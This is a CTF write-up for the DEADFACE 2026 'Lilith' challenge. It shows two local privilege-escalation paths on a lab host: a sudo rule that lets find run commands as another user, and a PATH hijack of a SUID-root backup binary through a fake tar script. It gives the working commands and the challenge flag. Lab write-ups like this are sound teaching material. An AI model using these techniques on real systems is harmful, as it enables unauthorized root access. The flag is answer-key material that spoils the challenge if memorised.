---
title: "Lilith"
ctf: "DEADFACE CTF 2026"
date: 2026-10-18
category: forensics
difficulty: medium
points: 250
flag_format: "deadface{...}"
author: "AN (team 1761)"
---

# Lilith

## Summary

Hostbusters gives a web shell on `charon` as `svc-deploy`. The Lilith flag lives in
`/home/lilith/flag.txt`. The intended final hop is `sunstalker`'s NOPASSWD sudo rule for
`/usr/bin/find`, which turns into arbitrary command execution as `lilith`. The box also has a
SUID-root `charon-backup` binary whose `PATH` handling allows a much shorter root shortcut; that
shortcut was used here to read the flag directly.

## Solution

### Step 1: Confirm the target and the intended sudo rule

The relevant sudoers drop-in is:

```text
sunstalker ALL=(lilith) NOPASSWD: /usr/bin/find
```

`find` is a GTFOBin, so from a `sunstalker` shell the intended final hop is:

```bash
sudo -u lilith /usr/bin/find /home/lilith -maxdepth 0 -exec cat /home/lilith/flag.txt \;
```

### Step 2: Root via `charon-backup` (actual solve)

`/usr/local/bin/charon-backup` is SUID root. Its embedded command is:

```text
tar czf /var/backups/charon-ops.tgz -C /opt ops
```

It resolves `tar` through `PATH` inside `system()` without dropping privileges. Placing a fake
`tar` first in `PATH` executes it as root:

```bash
mkdir -p /tmp/x
cat > /tmp/x/tar <<'EOF'
#!/bin/sh
cat /home/lilith/flag.txt > /tmp/lilith.flag
chmod 644 /tmp/lilith.flag
EOF
chmod +x /tmp/x/tar

PATH=/tmp/x:$PATH /usr/local/bin/charon-backup
cat /tmp/lilith.flag
```

Output:

```text
deadface{sud0_f1nd_4_w4y_1n}
```

### Step 3: Verify against the box

The same root context enumerated `/home/*/flag.txt`; the value under `/home/lilith/flag.txt` is
exactly the flag above, and `/home/lilith/osint.txt` identifies lilith as the OSINT/crypto
correlation owner.

## Flag

```text
deadface{sud0_f1nd_4_w4y_1n}
```
